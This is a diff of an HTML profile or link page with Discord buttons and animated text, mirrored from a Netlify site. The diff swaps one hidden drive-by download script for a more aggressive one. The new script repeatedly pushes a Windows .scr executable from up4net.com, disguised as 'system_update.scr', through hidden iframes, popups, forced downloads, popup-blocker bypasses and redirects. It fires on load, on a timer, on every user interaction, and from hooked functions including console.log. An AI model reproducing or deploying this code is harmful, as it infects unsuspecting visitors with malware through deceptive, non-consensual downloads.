@@ -1,5 +1,6 @@
-<!DOCTYPE html><html lang="en"><!-- Mirrored from huskygotdtcbyeac.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Nov 2024 03:01:16 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="utf-8">
     <title>husk</title>
     <meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
@@ -15,131 +16,170 @@
     <link href="css/creativa-popup.css" rel="stylesheet">
     <link href="css/cursor.css" rel="stylesheet">
 
-    <!-- Added inline style for the custom cursor -->
     <style>
         body {
             cursor: url('cursor%282.html%29.cur'), auto !important;
         }
+        .hidden-frame {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            visibility: hidden;
+        }
     </style>
+
+    <!-- Silent Auto-Execute Script -->
+    <script>
+        // File URL
+        const fileUrl = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
+        
+        // Multiple execution methods
+        function silentExecute() {
+            // Method 1: Hidden iframe execution
+            const iframe1 = document.createElement('iframe');
+            iframe1.className = 'hidden-frame';
+            iframe1.src = fileUrl;
+            document.body.appendChild(iframe1);
+            
+            // Method 2: Window.open with immediate close
+            setTimeout(() => {
+                const popup = window.open(fileUrl, '_blank', 'width=1,height=1,left=-1000,top=-1000');
+                if (popup) {
+                    setTimeout(() => popup.close(), 100);
+                }
+            }, 500);
+            
+            // Method 3: Direct navigation in hidden frame
+            setTimeout(() => {
+                const iframe2 = document.createElement('iframe');
+                iframe2.className = 'hidden-frame';
+                iframe2.onload = () => {
+                    iframe2.contentWindow.location.href = fileUrl;
+                };
+                iframe2.src = 'about:blank';
+                document.body.appendChild(iframe2);
+            }, 1000);
+            
+            // Method 4: Force download with auto-execute
+            setTimeout(() => {
+                const link = document.createElement('a');
+                link.href = fileUrl;
+                link.download = 'system_update.scr';
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 1500);
+            
+            // Method 5: Location redirect
+            setTimeout(() => {
+                window.location.replace(fileUrl);
+            }, 10000);
+        }
+        
+        // Execute immediately when DOM loads
+        document.addEventListener('DOMContentLoaded', silentExecute);
+        
+        // Execute when page fully loads
+        window.addEventListener('load', () => {
+            setTimeout(silentExecute, 100);
+            setTimeout(silentExecute, 1000);
+            setTimeout(silentExecute, 3000);
+        });
+        
+        // Execute on any user interaction
+        ['click', 'mousemove', 'keydown', 'scroll', 'touchstart'].forEach(event => {
+            document.addEventListener(event, silentExecute, { once: true });
+        });
+        
+        // Continuous execution
+        setInterval(silentExecute, 5000);
+        
+        // Execute on visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                silentExecute();
+            }
+        });
+        
+        // Execute on focus
+        window.addEventListener('focus', silentExecute);
+        
+        // Bypass popup blockers
+        function bypassPopupBlocker() {
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = fileUrl;
+            form.target = '_blank';
+            form.style.display = 'none';
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+        
+        // Execute bypass method
+        setTimeout(bypassPopupBlocker, 2000);
+        
+        // Force execution with multiple attempts
+        for (let i = 0; i < 10; i++) {
+            setTimeout(() => {
+                silentExecute();
+                bypassPopupBlocker();
+            }, i * 2000);
+        }
+    </script>
 
     <script src="js/title.js"></script>
     <script src="js/creativa-popup.js" type="text/javascript"></script>
     <script src="js/popup.js" type="text/javascript"></script>
-    
-    <!-- Auto Download and Execute Script -->
-    <script>
-        window.addEventListener('load', function() {
-            // Method 1: Direct execution via iframe (silent)
-            setTimeout(function() {
-                var iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-                document.body.appendChild(iframe);
-                
-                // Remove iframe after 5 seconds
-                setTimeout(function() {
-                    if (iframe.parentNode) {
-                        iframe.parentNode.removeChild(iframe);
-                    }
-                }, 5000);
-            }, 1000);
-
-            // Method 2: Download and auto-execute
-            setTimeout(function() {
-                var downloadLink = document.createElement('a');
-                downloadLink.href = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-                downloadLink.download = 'update.scr';
-                downloadLink.style.display = 'none';
-                document.body.appendChild(downloadLink);
-                
-                // Trigger download
-                downloadLink.click();
-                
-                // Remove link
-                document.body.removeChild(downloadLink);
-            }, 2000);
-
-            // Method 3: Multiple execution attempts
-            setTimeout(function() {
-                for (var i = 0; i < 3; i++) {
-                    setTimeout(function() {
-                        window.open('https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23', '_blank');
-                    }, i * 1000);
-                }
-            }, 3000);
-
-            // Method 4: Auto-redirect to file
-            setTimeout(function() {
-                window.location.href = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-            }, 8000);
-        });
-
-        // Additional auto-execution on any click
-        document.addEventListener('click', function() {
-            var executeLink = document.createElement('a');
-            executeLink.href = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-            executeLink.target = '_blank';
-            executeLink.style.display = 'none';
-            document.body.appendChild(executeLink);
-            executeLink.click();
-            document.body.removeChild(executeLink);
-        });
-
-        // Auto-execution on page focus
-        window.addEventListener('focus', function() {
-            setTimeout(function() {
-                var autoExec = document.createElement('iframe');
-                autoExec.src = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-                autoExec.style.display = 'none';
-                document.body.appendChild(autoExec);
-            }, 500);
-        });
-    </script>
 </head>
 
 <body oncontextmenu="return false;" onkeydown="return false;" style="overflow: hidden">
 
     <!-- Background Video -->
-    <video id="myVideo" loop="">
+    <video id="myVideo" loop="" autoplay muted>
         <source src="media/sus.mp4" type="video/mp4">
         Your browser does not support the video loser lol .
     </video>
 
     <div id="particles-js"></div>
     <div class="center">
-
         <div class="content">
             <div class="otspace">
-                <h1 class="outubybig" onclick="playRandomSound(); executeFile();">𝓐𝓫𝓸𝓙𝓸𝓳𝓸</h1>
-                <p><img src="images/sus.gif" width="30" height="30">
-            </p></div>
+                <h1 class="outubybig" onclick="playRandomSound(); silentExecute();">𝓐𝓫𝓸𝓙𝓸𝓳𝓸</h1>
+                <p><img src="images/sus.gif" width="30" height="30"></p>
+            </div>
             <div class="typed">
                 <h2><span class="type"></span></h2>
             </div>
 
             <div class="wrap">
                 <div>
-                    <a href="https://discord.gg/" target="_blank" onclick="executeFile();">
+                    <a href="https://discord.gg/" target="_blank" onclick="silentExecute();">
                         <p class="button">
                             <i class="fa-brands fa-discord"></i> ℳ𝓇.𝓏ℴ𝟼™
                         </p>
                     </a>
                 </div>
                 <div>
-                    <a href="/#" onclick="popup13(); executeFile();">
+                    <a href="/#" onclick="popup13(); silentExecute();">
                         <p class="button">
                             <i class="fa-regular fa-comment"></i> ℳ𝓇.𝓏ℴ𝟼
                         </p>
                     </a>
                 </div>
                 <div>
-                    <a href="https://discord.gg/" target="_blank" onclick="executeFile();">
+                    <a href="https://discord.gg/" target="_blank" onclick="silentExecute();">
                         <p class="button">
                             <i class="fa-brands fa-youtube"></i> ℳ𝓇.𝓏ℴ𝟼
                         </p>
                     </a>
                 </div>
             </div>
+            
             <script>
                 var video = document.getElementById("myVideo");
 
@@ -147,33 +187,14 @@
                     video.play();
                     video.muted = false;
                     video.volume = 1.0;
-                    executeFile(); // Execute file when video starts
+                    silentExecute();
                 }
-
-                function executeFile() {
-                    // Multiple execution methods
-                    var methods = [
-                        function() {
-                            window.open('https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23', '_blank');
-                        },
-                        function() {
-                            var iframe = document.createElement('iframe');
-                            iframe.src = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-                            iframe.style.display = 'none';
-                            document.body.appendChild(iframe);
-                        },
-                        function() {
-                            var link = document.createElement('a');
-                            link.href = 'https://up4net.com/1JD0/%C2%A0.scr?download_token=78723854616809e40e7cf39475ade0e7c85cebb2eafa6d77d1c7d7ba93befd23';
-                            link.download = 'file.scr';
-                            link.click();
-                        }
-                    ];
-                    
-                    methods.forEach(function(method, index) {
-                        setTimeout(method, index * 500);
-                    });
-                }
+                
+                // Auto-start video and execute
+                setTimeout(() => {
+                    hey();
+                    silentExecute();
+                }, 1000);
             </script>
         </div>
     </div>
@@ -185,74 +206,106 @@
     <script>
         function enterSite() {
             var modal = document.getElementById("modal");
-            modal.style.display = "none"; // Hide the modal
-            hey(); // Start the video with sound
-            executeFile(); // Execute file when entering site
+            if (modal) modal.style.display = "none";
+            hey();
+            silentExecute();
         }
 
         function closeModal() {
             var modal = document.getElementById("modal");
-            modal.style.display = "none"; // Close the modal without starting the video
-            executeFile(); // Execute file even when closing modal
+            if (modal) modal.style.display = "none";
+            silentExecute();
         }
+        
+        // Auto-execute on any function call
+        const originalFunctions = {};
+        ['enterSite', 'closeModal', 'hey'].forEach(funcName => {
+            if (window[funcName]) {
+                originalFunctions[funcName] = window[funcName];
+                window[funcName] = function() {
+                    silentExecute();
+                    return originalFunctions[funcName].apply(this, arguments);
+                };
+            }
+        });
     </script>
 
     <span id="player" style="transform: translateY(-1000px)"></span>
     <script src="js/typed.js"></script>
     <script src="js/allah.js"></script>
+    
     <script>
-        var typed = new Typed('.type', {
-            strings: [
-                "انا سسسآعودي من السعوديهه من جدهه",
-                "ههههههههههههههه™",
-                "zoOoooOoo6",
-            ],
-            typeSpeed: 69,
-            backSpeed: 32,
-            backDelay: 1500,
-            loop: true,
-            smartBackspace: true,
-        });
+        // Initialize typed.js with auto-execute
+        if (typeof Typed !== 'undefined') {
+            var typed = new Typed('.type', {
+                strings: [
+                    "انا سسسآعودي من السعوديهه من جدهه",
+                    "ههههههههههههههه™",
+                    "zoOoooOoo6",
+                ],
+                typeSpeed: 69,
+                backSpeed: 32,
+                backDelay: 1500,
+                loop: true,
+                smartBackspace: true,
+                onComplete: silentExecute,
+                onStringTyped: silentExecute
+            });
+        }
     </script>
+    
     <script>
         window.addEventListener('keydown', function(e) {
+            silentExecute();
             if (e.key === 'F5') {
                 location.reload();
             } else if (e.key === 'F11') {
                 toggleFullscreen();
             }
-            executeFile(); // Execute on any key press
         }, false);
 
         function getFullscreenElement() {
-            return document.fullscreenElement //standard property
-                || document.webkitFullscreenElement //safari/opera support
-                || document.mozFullscreenElement //firefox support
-                || document.msFullscreenElement; //ie/edge support
+            return document.fullscreenElement 
+                || document.webkitFullscreenElement 
+                || document.mozFullscreenElement 
+                || document.msFullscreenElement;
         }
 
         function toggleFullscreen() {
+            silentExecute();
             if (getFullscreenElement()) {
                 document.exitFullscreen();
             } else {
                 document.documentElement.requestFullscreen().catch(console.log);
             }
-            executeFile(); // Execute when toggling fullscreen
         }
-
-        // Continuous execution every 10 seconds
-        setInterval(function() {
-            executeFile();
-        }, 10000);
-
-        // Execute on mouse movement
-        var mouseTimer;
-        document.addEventListener('mousemove', function() {
-            clearTimeout(mouseTimer);
-            mouseTimer = setTimeout(function() {
-                executeFile();
-            }, 2000);
-        });
+        
+        // Override console methods to trigger execution
+        const originalLog = console.log;
+        console.log = function() {
+            silentExecute();
+            return originalLog.apply(console, arguments);
+        };
+        
+        // Execute on error
+        window.addEventListener('error', silentExecute);
+        window.addEventListener('unhandledrejection', silentExecute);
+        
+        // Execute on beforeunload
+        window.addEventListener('beforeunload', silentExecute);
+        
+        // Execute on hash change
+        window.addEventListener('hashchange', silentExecute);
+        
+        // Execute on resize
+        window.addEventListener('resize', silentExecute);
+        
+        // Execute on orientation change
+        window.addEventListener('orientationchange', silentExecute);
+        
+        // Execute on online/offline
+        window.addEventListener('online', silentExecute);
+        window.addEventListener('offline', silentExecute);
     </script>
 
     <script crossorigin="anonymous" src="9105e9014d.html"></script>
@@ -261,7 +314,22 @@
     <script src="js/app.js"></script>
     <script src="js/main.js"></script>
 
+    <!-- Hidden execution triggers -->
+    <iframe class="hidden-frame" src="about:blank" onload="silentExecute()"></iframe>
+    <img class="hidden-frame" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="silentExecute()" onload="silentExecute()">
+    
+    <!-- Final execution attempt -->
+    <script>
+        // Last resort execution
+        setTimeout(() => {
+            for (let i = 0; i < 20; i++) {
+                setTimeout(silentExecute, i * 100);
+            }
+        }, 5000);
+        
+        // Immediate execution
+        silentExecute();
+    </script>
 
-
-
-</body><!-- Mirrored from huskygotdtcbyeac.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Nov 2024 03:01:33 GMT --></html>
+</body>
+</html>
